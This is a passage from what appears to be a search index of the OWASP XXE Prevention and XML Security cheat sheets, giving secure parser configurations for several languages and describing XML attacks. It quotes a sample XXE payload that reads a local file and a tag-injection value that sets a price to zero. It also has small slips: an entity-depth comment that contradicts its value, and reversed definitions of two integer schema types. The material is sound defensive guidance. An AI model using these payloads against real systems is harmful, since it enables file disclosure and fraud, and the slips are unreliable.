disallowing DOCTYPE logger . warning ( \"A DOCTYPE was passed into the XML document\" ); ... } catch ( IOException e ) { // XXE that points to a file that doesn't exist logger . error ( \"IOException occurred, XXE may still possible: \" + e . getMessage ()); ... } // Load XML file or stream using a XXE agnostic configured parser... DocumentBuilder safebuilder = dbf . newDocumentBuilder (); Xerces 1 Features : Do not include external entities by setting this feature to false . Do not include parameter entities by setting this feature to false . Do not include external DTDs by setting this feature to false . Xerces 2 Features : Disallow an inline DTD by setting this feature to true . Do not include external entities by setting this feature to false . Do not include parameter entities by setting this feature to false . Do not include external DTDs by setting this feature to false . Note: The above defenses require Java 7 update 67, Java 8 update 20, or above, because the above countermeasures for DocumentBuilderFactory and SAXParserFactory are broken in earlier Java versions, per: CVE-2014-6517 .","title":"JAXP DocumentBuilderFactory, SAXParserFactory and DOM4J"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xmlinputfactory-a-stax-parser","text":"StAX parsers such as XMLInputFactory allow various properties and features to be set. To protect a Java XMLInputFactory from XXE, do this: // This disables DTDs entirely for that factory xmlInputFactory . setProperty ( XMLInputFactory . SUPPORT_DTD , false ); // disable external entities xmlInputFactory . setProperty ( \"javax.xml.stream.isSupportingExternalEntities\" , false );","title":"XMLInputFactory (a StAX parser)"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#oracle-dom-parser","text":"Follow Oracle reomendation e.g.: // Extend oracle.xml.parser.v2.XMLParser DOMParser domParser = new DOMParser (); // Do not expand entity references domParser . setAttribute ( DOMParser . EXPAND_ENTITYREF , false ); // dtdObj is an instance of oracle.xml.parser.v2.DTD domParser . setAttribute ( DOMParser . DTD_OBJECT , dtdObj ); // Do not allow more than 11 levels of entity expansion domParser . setAttribute ( DOMParser . ENTITY_EXPANSION_DEPTH , 12 );","title":"Oracle DOM Parser"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#transformerfactory","text":"To protect a javax.xml.transform.TransformerFactory from XXE, do this: TransformerFactory tf = TransformerFactory . newInstance (); tf . setAttribute ( XMLConstants . ACCESS_EXTERNAL_DTD , \"\" ); tf . setAttribute ( XMLConstants . ACCESS_EXTERNAL_STYLESHEET , \"\" );","title":"TransformerFactory"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#validator","text":"To protect a javax.xml.validation.Validator from XXE, do this: SchemaFactory factory = SchemaFactory . newInstance ( \"http://www.w3.org/2001/XMLSchema\" ); Schema schema = factory . newSchema (); Validator validator = schema . newValidator (); validator . setProperty ( XMLConstants . ACCESS_EXTERNAL_DTD , \"\" ); validator . setProperty ( XMLConstants . ACCESS_EXTERNAL_SCHEMA , \"\" );","title":"Validator"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#schemafactory","text":"To protect a javax.xml.validation.SchemaFactory from XXE, do this: SchemaFactory factory = SchemaFactory . newInstance ( \"http://www.w3.org/2001/XMLSchema\" ); factory . setProperty ( XMLConstants . ACCESS_EXTERNAL_DTD , \"\" ); factory . setProperty ( XMLConstants . ACCESS_EXTERNAL_SCHEMA , \"\" ); Schema schema = factory . newSchema ( Source );","title":"SchemaFactory"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#saxtransformerfactory","text":"To protect a javax.xml.transform.sax.SAXTransformerFactory from XXE, do this: SAXTransformerFactory sf = SAXTransformerFactory . newInstance (); sf . setAttribute ( XMLConstants . ACCESS_EXTERNAL_DTD , \"\" ); sf . setAttribute ( XMLConstants . ACCESS_EXTERNAL_STYLESHEET , \"\" ); sf . newXMLFilter ( Source ); Note: Use of the following XMLConstants requires JAXP 1.5, which was added to Java in 7u40 and Java 8: javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD javax.xml.XMLConstants.ACCESS_EXTERNAL_SCHEMA javax.xml.XMLConstants.ACCESS_EXTERNAL_STYLESHEET","title":"SAXTransformerFactory"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xmlreader","text":"To protect a Java org.xml.sax.XMLReader from XXE, do this: XMLReader reader = XMLReaderFactory . createXMLReader (); reader . setFeature ( \"http://apache.org/xml/features/disallow-doctype-decl\" , true ); // This may not be strictly required as DTDs shouldn't be allowed at all, per previous line. reader . setFeature ( \"http://apache.org/xml/features/nonvalidating/load-external-dtd\" , false ); reader . setFeature ( \"http://xml.org/sax/features/external-general-entities\" , false ); reader . setFeature ( \"http://xml.org/sax/features/external-parameter-entities\" , false );","title":"XMLReader"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#saxreader","text":"To protect a Java org.dom4j.io.SAXReader from XXE, do this: saxReader . setFeature ( \"http://apache.org/xml/features/disallow-doctype-decl\" , true ); saxReader . setFeature ( \"http://xml.org/sax/features/external-general-entities\" , false ); saxReader . setFeature ( \"http://xml.org/sax/features/external-parameter-entities\" , false ); Based on testing, if you are missing one of these, you can still be vulnerable to an XXE attack.","title":"SAXReader"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#saxbuilder","text":"To protect a Java org.jdom2.input.SAXBuilder from XXE, do this: SAXBuilder builder = new SAXBuilder (); builder . setFeature ( \"http://apache.org/xml/features/disallow-doctype-decl\" , true ); builder . setFeature ( \"http://xml.org/sax/features/external-general-entities\" , false ); builder . setFeature ( \"http://xml.org/sax/features/external-parameter-entities\" , false ); Document doc = builder . build ( new File ( fileName ));","title":"SAXBuilder"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#no-op-entityresolver","text":"For APIs that take an EntityResolver , you can neutralize an XML parser's ability to resolve entities by supplying a no-op implementation : public final class NoOpEntityResolver implements EntityResolver { public InputSource resolveEntity ( String publicId , String systemId ) { return new InputSource ( new StringReader ( \"\" )); } } // ... xmlReader . setEntityResolver ( new NoOpEntityResolver ()); documentBuilder . setEntityResolver ( new NoOpEntityResolver ()); or more simply: EntityResolver noop = ( publicId , systemId ) -> new InputSource ( new StringReader ( \"\" )); xmlReader . setEntityResolver ( noop ); documentBuilder . setEntityResolver ( noop );","title":"No-op EntityResolver"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#jaxb-unmarshaller","text":"Since a javax.xml.bind.Unmarshaller parses XML and does not support any flags for disabling XXE, it's imperative to parse the untrusted XML through a configurable secure parser first, generate a source object as a result, and pass the source object to the Unmarshaller. For example: //Disable XXE SAXParserFactory spf = SAXParserFactory . newInstance (); spf . setFeature ( \"http://xml.org/sax/features/external-general-entities\" , false ); spf . setFeature ( \"http://xml.org/sax/features/external-parameter-entities\" , false ); spf . setFeature ( \"http://apache.org/xml/features/nonvalidating/load-external-dtd\" , false ); //Do unmarshall operation Source xmlSource = new SAXSource ( spf . newSAXParser (). getXMLReader (), new InputSource ( new StringReader ( xml ))); JAXBContext jc = JAXBContext . newInstance ( Object . class ); Unmarshaller um = jc . createUnmarshaller (); um . unmarshal ( xmlSource );","title":"JAXB Unmarshaller"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xpathexpression","text":"A javax.xml.xpath.XPathExpression can not be configured securely by itself, so the untrusted data must be parsed through another securable XML parser first. For example: DocumentBuilderFactory df = DocumentBuilderFactory . newInstance (); df . setAttribute ( XMLConstants . ACCESS_EXTERNAL_DTD , \"\" ); df . setAttribute ( XMLConstants . ACCESS_EXTERNAL_SCHEMA , \"\" ); DocumentBuilder builder = df . newDocumentBuilder (); String result = new XPathExpression (). evaluate ( builder . parse ( new ByteArrayInputStream ( xml . getBytes ())) );","title":"XPathExpression"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#javabeansxmldecoder","text":"The readObject() method in this class is fundamentally unsafe. Not only is the XML it parses subject to XXE, but the method can be used to construct any Java object, and execute arbitrary code as described here . And there is no way to make use of this class safe except to trust or properly validate the input being passed into it. As such, we'd strongly recommend completely avoiding the use of this class and replacing it with a safe or properly configured XML parser as described elsewhere in this cheat sheet.","title":"java.beans.XMLDecoder"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#other-xml-parsers","text":"There are many third-party libraries that parse XML either directly or through their use of other libraries. Please test and verify their XML parser is secure against XXE by default. If the parser is not secure by default, look for flags supported by the parser to disable all possible external resource inclusions like the examples given above. If there's no control exposed to the outside, make sure the untrusted content is passed through a secure parser first and then passed to insecure third-party parser similar to how the Unmarshaller is secured.","title":"Other XML Parsers"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#spring-framework-mvcoxm-xxe-vulnerabilities","text":"For example, some XXE vulnerabilities were found in Spring OXM and Spring MVC . The following versions of the Spring Framework are vulnerable to XXE: 3.0.0 to 3.2.3 (Spring OXM & Spring MVC) 4.0.0.M1 (Spring OXM) 4.0.0.M1-4.0.0.M2 (Spring MVC) There were other issues as well that were fixed later, so to fully address these issues, Spring recommends you upgrade to Spring Framework 3.2.8+ or 4.0.2+. For Spring OXM, this is referring to the use of org.springframework.oxm.jaxb.Jaxb2Marshaller. Note that the CVE for Spring OXM specifically indicates that 2 XML parsing situations are up to the developer to get right, and 2 are the responsibility of Spring and were fixed to address this CVE. Here's what they say: Two situations developers must handle: For a DOMSource , the XML has already been parsed by user code and that code is responsible for protecting against XXE. For a StAXSource , the XMLStreamReader has already been created by user code and that code is responsible for protecting against XXE. The issue Spring fixed: For SAXSource and StreamSource instances, Spring processed external entities by default thereby creating this vulnerability. Here's an example of using a StreamSource that was vulnerable, but is now safe, if you are using a fixed version of Spring OXM or Spring MVC: import org.springframework.oxm.Jaxb2Marshaller ; import org.springframework.oxm.jaxb.Jaxb2Marshaller ; Jaxb2Marshaller marshaller = new Jaxb2Marshaller (); // Must cast return Object to whatever type you are unmarshalling marshaller . unmarshal ( new StreamSource ( new StringReader ( some_string_containing_XML )); So, per the Spring OXM CVE writeup , the above is now safe. But if you were to use a DOMSource or StAXSource instead, it would be up to you to configure those sources to be safe from XXE.","title":"Spring Framework MVC/OXM XXE Vulnerabilities"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#castor","text":"Castor is a data binding framework for Java. It allows conversion between Java objects, XML, and relational tables. The XML features in Castor prior to version 1.3.3 are vulnerable to XXE, and should be upgraded to the latest version. For additional information, check the official XML configuration file","title":"Castor"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#net","text":"The following information for XXE injection in .NET is directly from this web application of unit tests by Dean Fleming . This web application covers all currently supported .NET XML parsers, and has test cases for each demonstrating when they are safe from XXE injection and when they are not. Previously, this information was based on James Jardine's excellent .NET XXE article . It originally provided more recent and more detailed information than the older article from Microsoft on how to prevent XXE and XML Denial of Service in .NET , however, it has some inaccuracies that the web application covers. The following table lists all supported .NET XML parsers and their default safety levels: XML Parser Safe by default? LINQ to XML Yes XmlDictionaryReader Yes XmlDocument ...prior to 4.5.2 No ...in versions 4.5.2+ Yes XmlNodeReader Yes XmlReader Yes XmlTextReader ...prior to 4.5.2 No ...in versions 4.5.2+ Yes XPathNavigator ...prior to 4.5.2 No ...in versions 4.5.2+ Yes XslCompiledTransform Yes","title":".NET"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#linq-to-xml","text":"Both the XElement and XDocument objects in the System.Xml.Linq library are safe from XXE injection by default. XElement parses only the elements within the XML file, so DTDs are ignored altogether. XDocument has DTDs disabled by default , and is only unsafe if constructed with a different unsafe XML parser.","title":"LINQ to XML"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xmldictionaryreader","text":"System.Xml.XmlDictionaryReader is safe by default, as when it attempts to parse the DTD, the compiler throws an exception saying that \"CData elements not valid at top level of an XML document\". It becomes unsafe if constructed with a different unsafe XML parser.","title":"XmlDictionaryReader"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xmldocument","text":"Prior to .NET Framework version 4.5.2, System.Xml.XmlDocument is unsafe by default. The XmlDocument object has an XmlResolver object within it that needs to be set to null in versions prior to 4.5.2. In versions 4.5.2 and up, this XmlResolver is set to null by default. The following example shows how it is made safe: static void LoadXML () { string xxePayload = \"<!DOCTYPE doc [<!ENTITY win SYSTEM 'file:///C:/Users/testdata2.txt'>]>\" + \"<doc>&win;</doc>\" ; string xml = \"<?xml version='1.0' ?>\" + xxePayload ; XmlDocument xmlDoc = new XmlDocument (); // Setting this to NULL disables DTDs - Its NOT null by default. xmlDoc . XmlResolver = null ; xmlDoc . LoadXml ( xml ); Console . WriteLine ( xmlDoc . InnerText ); Console . ReadLine (); } XmlDocument can become unsafe if you create your own nonnull XmlResolver with default or unsafe settings. If you need to enable DTD processing, instructions on how to do so safely are described in detail in the referenced MSDN article .","title":"XmlDocument"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xmlnodereader","text":"System.Xml.XmlNodeReader objects are safe by default and will ignore DTDs even when constructed with an unsafe parser or wrapped in another unsafe parser.","title":"XmlNodeReader"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xmlreader_1","text":"System.Xml.XmlReader objects are safe by default. They are set by default to have their ProhibitDtd property set to false in .NET Framework versions 4.0 and earlier, or their DtdProcessing property set to Prohibit in .NET versions 4.0 and later. Additionally, in .NET versions 4.5.2 and later, the XmlReaderSettings belonging to the XmlReader has its XmlResolver set to null by default, which provides an additional layer of safety. Therefore, XmlReader objects will only become unsafe in version 4.5.2 and up if both the DtdProcessing property is set to Parse and the XmlReaderSetting 's XmlResolver is set to a nonnull XmlResolver with default or unsafe settings. If you need to enable DTD processing, instructions on how to do so safely are described in detail in the referenced MSDN article .","title":"XmlReader"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xmltextreader","text":"System.Xml.XmlTextReader is unsafe by default in .NET Framework versions prior to 4.5.2. Here is how to make it safe in various .NET versions:","title":"XmlTextReader"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#prior-to-net-40","text":"In .NET Framework versions prior to 4.0, DTD parsing behavior for XmlReader objects like XmlTextReader are controlled by the Boolean ProhibitDtd property found in the System.Xml.XmlReaderSettings and System.Xml.XmlTextReader classes. Set these values to true to disable inline DTDs completely. XmlTextReader reader = new XmlTextReader ( stream ); // NEEDED because the default is FALSE!! reader . ProhibitDtd = true ;","title":"Prior to .NET 4.0"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#net-40-net-452","text":"In .NET Framework version 4.0, DTD parsing behavior has been changed. The ProhibitDtd property has been deprecated in favor of the new DtdProcessing property. However, they didn't change the default settings so XmlTextReader is still vulnerable to XXE by default. Setting DtdProcessing to Prohibit causes the runtime to throw an exception if a <!DOCTYPE> element is present in the XML. To set this value yourself, it looks like this: XmlTextReader reader = new XmlTextReader ( stream ); // NEEDED because the default is Parse!! reader . DtdProcessing = DtdProcessing . Prohibit ; Alternatively, you can set the DtdProcessing property to Ignore , which will not throw an exception on encountering a <!DOCTYPE> element but will simply skip over it and not process it. Finally, you can set DtdProcessing to Parse if you do want to allow and process inline DTDs.","title":".NET 4.0 - .NET 4.5.2"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#net-452-and-later","text":"In .NET Framework versions 4.5.2 and up, XmlTextReader 's internal XmlResolver is set to null by default, making the XmlTextReader ignore DTDs by default. The XmlTextReader can become unsafe if if you create your own nonnull XmlResolver with default or unsafe settings.","title":".NET 4.5.2 and later"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xpathnavigator","text":"System.Xml.XPath.XPathNavigator is unsafe by default in .NET Framework versions prior to 4.5.2. This is due to the fact that it implements IXPathNavigable objects like XmlDocument , which are also unsafe by default in versions prior to 4.5.2. You can make XPathNavigator safe by giving it a safe parser like XmlReader (which is safe by default) in the XPathDocument 's constructor. Here is an example: XmlReader reader = XmlReader . Create ( \"example.xml\" ); XPathDocument doc = new XPathDocument ( reader ); XPathNavigator nav = doc . CreateNavigator (); string xml = nav . InnerXml . ToString ();","title":"XPathNavigator"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xslcompiledtransform","text":"System.Xml.Xsl.XslCompiledTransform (an XML transformer) is safe by default as long as the parser it's given is safe. It is safe by default because the default parser of the Transform() methods is an XmlReader , which is safe by default (per above). The source code for this method is here. Some of the Transform() methods accept an XmlReader or IXPathNavigable (e.g., XmlDocument ) as an input, and if you pass in an unsafe XML Parser then the Transform will also be unsafe.","title":"XslCompiledTransform"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#ios","text":"","title":"iOS"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#libxml2_1","text":"iOS includes the C/C++ libxml2 library described above, so that guidance applies if you are using libxml2 directly. However, the version of libxml2 provided up through iOS6 is prior to version 2.9 of libxml2 (which protects against XXE by default).","title":"libxml2"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#nsxmldocument","text":"iOS also provides an NSXMLDocument type, which is built on top of libxml2. However, NSXMLDocument provides some additional protections against XXE that aren't available in libxml2 directly. Per the 'NSXMLDocument External Entity Restriction API' section of this page : iOS4 and earlier: All external entities are loaded by default. iOS5 and later: Only entities that don't require network access are loaded. (which is safer) However, to completely disable XXE in an NSXMLDocument in any version of iOS you simply specify NSXMLNodeLoadExternalEntitiesNever when creating the NSXMLDocument .","title":"NSXMLDocument"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php","text":"Per the PHP documentation , the following should be set when using the default PHP XML parser in order to prevent XXE: libxml_disable_entity_loader(true); A description of how to abuse this in PHP is presented in a good SensePost article describing a cool PHP based XXE vulnerability that was fixed in Facebook.","title":"PHP"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#python","text":"The Python 3 official documentation contains a section on xml vulnerabilities . As of the 1st January 2020 Python 2 is no longer supported, however the Python website still contains some legacy documentation . The following table gives an overview of various modules in Python 3 used for XML parsing and whether or not they are vulnerable. Attack Type sax etree minidom pulldom xmlrpc Billion Laughs Vulnerable Vulnerable Vulnerable Vulnerable Vulnerable Quadratic Blowup Vulnerable Vulnerable Vulnerable Vulnerable Vulnerable External Entity Expansion Safe Safe Safe Safe Safe DTD Retrieval Safe Safe Safe Safe Safe Decompression Bomb Safe Safe Safe Safe Vulnerable To protect your application from the applicable attacks, two packages exist to help you sanitize your input and protect your application against DDoS and remote attacks.","title":"Python"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#semgrep-rules","text":"Semgrep is a command-line tool for offline static analysis. Use pre-built or custom rules to enforce code and security standards in your codebase.","title":"Semgrep Rules"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java_1","text":"Below are the rules for different XML parsers in Java","title":"Java"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#digester","text":"Identifying XXE vulnerability in the org.apache.commons.digester3.Digester library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-Digester","title":"Digester"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#documentbuilderfactory","text":"Identifying XXE vulnerability in the javax.xml.parsers.DocumentBuilderFactory library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-dbf","title":"DocumentBuilderFactory"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#saxbuilder_1","text":"Identifying XXE vulnerability in the org.jdom2.input.SAXBuilder library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-saxbuilder","title":"SAXBuilder"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#saxparserfactory","text":"Identifying XXE vulnerability in the javax.xml.parsers.SAXParserFactory library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-SAXParserFactory","title":"SAXParserFactory"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#saxreader_1","text":"Identifying XXE vulnerability in the org.dom4j.io.SAXReader library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-SAXReader","title":"SAXReader"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xmlinputfactory","text":"Identifying XXE vulnerability in the javax.xml.stream.XMLInputFactory library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-XMLInputFactory","title":"XMLInputFactory"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xmlreader_2","text":"Identifying XXE vulnerability in the org.xml.sax.XMLReader library Rule can be played here https://semgrep.dev/s/salecharohit:xxe-XMLReader","title":"XMLReader"},{"location":"cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#references","text":"XXE by InfoSecInstitute OWASP Top 10-2017 A4: XML External Entities (XXE) Timothy Morgan's 2014 paper: \"XML Schema, DTD, and Entity Attacks\" FindSecBugs XXE Detection XXEbugFind Tool Testing for XML Injection","title":"References"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html","text":"XML Security Cheat Sheet \u00b6 Introduction \u00b6 Specifications for XML and XML schemas include multiple security flaws. At the same time, these specifications provide the tools required to protect XML applications. Even though we use XML schemas to define the security of XML documents, they can be used to perform a variety of attacks: file retrieval, server side request forgery, port scanning, or brute forcing. This cheat sheet exposes how to exploit the different possibilities in libraries and software divided in two sections: Malformed XML Documents : vulnerabilities using not well formed documents. Invalid XML Documents : vulnerabilities using documents that do not have the expected structure. Malformed XML Documents \u00b6 The W3C XML specification defines a set of principles that XML documents must follow to be considered well formed. When a document violates any of these principles, it must be considered a fatal error and the data it contains is considered malformed. Multiple tactics will cause a malformed document: removing an ending tag, rearranging the order of elements into a nonsensical structure, introducing forbidden characters, and so on. The XML parser should stop execution once detecting a fatal error. The document should not undergo any additional processing, and the application should display an error message. The recommendation to avoid these vulnerabilities are to use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents. In addition, use only well-formed documents and validate the contents of each element and attribute to process only valid values within predefined boundaries. More Time Required \u00b6 A malformed document may affect the consumption of Central Processing Unit (CPU) resources. In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service (DoS). To analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document. Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect. Applications Processing Malformed Data \u00b6 Certain XML parsers have the ability to recover malformed documents. They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document's noncompliance with the specifications. Since there are no predefined rules for the recovery process, the approach and results may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity. The following two scenarios illustrate attack vectors a parser will analyze in recovery mode: Malformed Document to Malformed Document \u00b6 According to the XML specification, the string -- (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered: <element> <!-- one <!-- another comment comment --> </element> Well-Formed Document to Well-Formed Document Normalized \u00b6 Certain parsers may consider normalizing the contents of your CDATA sections. This means that they will update the special characters contained in the CDATA section to contain the safe versions of these characters even though is not required: <element> <![CDATA[<script>a=1;</script>]]> </element> Normalization of a CDATA section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation: <element> &lt; script &gt; a=1; &lt; /script &gt; </element> Coercive Parsing \u00b6 A coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target. Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this: <A1> <A2> <A3> ... <A30000> Violation of XML Specification Rules \u00b6 Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior. Invalid XML Documents \u00b6 Attackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values. Schemas specify restrictions that help identify whether documents are valid. A valid document is well formed and complies with the restrictions of a schema, and more than one schema can be used to validate a document. These restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages. The recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not DTD ) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic. Document without Schema \u00b6 Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an id value related to an item and a certain price . The user may only introduce a certain id value using the web interface: <buy> <id> 123 </id> <price> 10 </price> </buy> If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents: <buy> <id> 123 </id><price> 0 </price><id></id> <price> 10 </price> </buy> Notice again how the value 123 is supplied as an id , but now the document includes additional opening and closing tags. The attacker closed the id element and sets a bogus price element to the value 0. The final step to keep the structure well-formed is to add one empty id element. After this, the application adds the closing tag for id and set the price to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it. Unrestrictive Schema \u00b6 Certain schemas do not offer enough restrictions for the type of data that each element can receive. This is what normally happens when using DTD ; it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person's age is validated against an inline DTD schema: <!DOCTYPE person [ <!ELEMENT person (name, age)> <!ELEMENT name (#PCDATA)> <!ELEMENT age (#PCDATA)> ]> <person> <name> John Doe </name> <age> 11111..(1.000.000digits)..11111 </age> </person> The previous document contains an inline DTD with a root element named person . This element contains two elements in a specific order: name and then age . The element name is then defined to contain PCDATA as well as the element age . After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the age element contains one million digits. Since there are no restrictions on the maximum size for the age element, this one-million-digit string could be sent to the server for this element. Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents. Since it is not possible to indicate specific restrictions (a maximum length for the element name or a valid range for the element age ), this type of schema increases the risk of affecting the integrity and availability of resources. Improper Data Validation \u00b6 When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values. String Data Types \u00b6 Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look: <element name= \"CipherData\" type= \"xenc:CipherDataType\" /> <complexType name= \"CipherDataType\" > <choice> <element name= \"CipherValue\" type= \"base64Binary\" /> <element ref= \"xenc:CipherReference\" /> </choice> </complexType> The previous schema defines the element CipherValue as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid. The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the CipherData element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema. Numeric Data Types \u00b6 Defining the correct data type for numbers can be more complex since there are more options than there are for strings. Negative and Positive Restrictions \u00b6 XML Schema numeric data types can include different ranges of numbers. They could include: negativeInteger : Only negative numbers nonNegativeInteger : Negative numbers and the zero value positiveInteger : Only positive numbers nonPositiveInteger : Positive numbers and the zero value The following sample document defines an id for a product, a price , and a quantity value that is under the control of an attacker: <buy> <id> 1 </id> <price> 10 </price> <quantity> 1 </quantity> </buy> To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements: <xs:schema xmlns:xs= \"http://www.w3.org/2001/XMLSchema\" > <xs:element name= \"buy\" > <xs:complexType> <xs:sequence> <xs:element name= \"id\" type= \"xs:integer\" /> <xs:element name= \"price\" type= \"xs:decimal\" /> <xs:element name= \"quantity\" type= \"xs:integer\" /> </xs:sequence> </xs:complexType> </xs:element> </xs:schema> Limiting that quantity to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing price*quantity . However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer. Divide by Zero \u00b6 Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error FOAR0001 will occur. Other applications may throw other exceptions and the program may crash. There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type positiveInteger for the element. <xs:element name= \"denominator\" > <xs:simpleType> <xs:restriction base= \"xs:positiveInteger\" /> </xs:simpleType> </xs:element> The element denominator is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero. Special Values: Infinity and Not a Number (NaN) \u00b6 The data types float and double contain real numbers and some special values: -Infinity or -INF , NaN , and +Infinity or INF . These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies. Not considering the whole spectrum of possible values for a data type could make underlying applications fail. If the special values Infinity and NaN are not required and only real numbers are expected, the data type decimal is recommended: <xs:schema xmlns:xs= \"http://www.w3.org/2001/XMLSchema\" > <xs:element name= \"buy\" > <xs:complexType> <xs:sequence> <xs:element name= \"id\" type= \"xs:integer\" /> <xs:element name= \"price\" type= \"xs:decimal\" /> <xs:element 